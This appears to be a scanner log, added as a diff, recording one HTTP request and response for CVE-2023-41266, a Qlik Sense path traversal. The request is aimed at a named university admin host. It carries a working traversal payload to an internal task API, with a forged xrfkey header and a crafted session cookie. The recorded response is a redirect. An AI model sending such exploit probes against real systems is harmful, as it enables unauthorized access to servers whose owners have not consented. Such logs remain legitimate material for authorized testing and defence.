@@ -1,0 +1,29 @@
+[CVE-2023-41266] Dumped HTTP request for http://admin.trinity.unimelb.edu.au/resources/qmc/fonts/../../../qrs/ReloadTask?xrfkey=1333333333333337&filter=.ttf
+
+
+GET /resources/qmc/fonts/../../../qrs/ReloadTask?xrfkey=1333333333333337&filter=.ttf HTTP/1.1
+Host: admin.trinity.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Cookie: X-Qlik-Session=13333333-3333-3333-3333-333333333337
+X-Qlik-Xrfkey: 1333333333333337
+Accept-Encoding: gzip
+
+
+[CVE-2023-41266] Dumped HTTP response http://admin.trinity.unimelb.edu.au/resources/qmc/fonts/../../../qrs/ReloadTask?xrfkey=1333333333333337&filter=.ttf
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Content-Length: 205
+Content-Security-Policy: child-src 'self' blob: ;    frame-src 'self' *.google.com *.facebook.com *.twitter.com *.recaptcha.net *.payway.com.au *.youtube.com *.vimeo.com *.viddler.com *.sharethis.com *.ddsn.net;    frame-ancestors 'self' *.ddsn.net
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:06 GMT
+Location: https://admin.trinity.unimelb.edu.au/admin?xrfkey=1333333333333337&filter=.ttf
+Server: Microsoft-IIS/10.0
+X-Frame-Options: SAMEORIGIN
+X-Powered-By: ASP.NET
+
+<head><title>Document Moved</title></head>
+<body><h1>Object Moved</h1>This document may be found <a HREF="https://admin.trinity.unimelb.edu.au/admin?xrfkey=1333333333333337&amp;filter=.ttf">here</a></body>
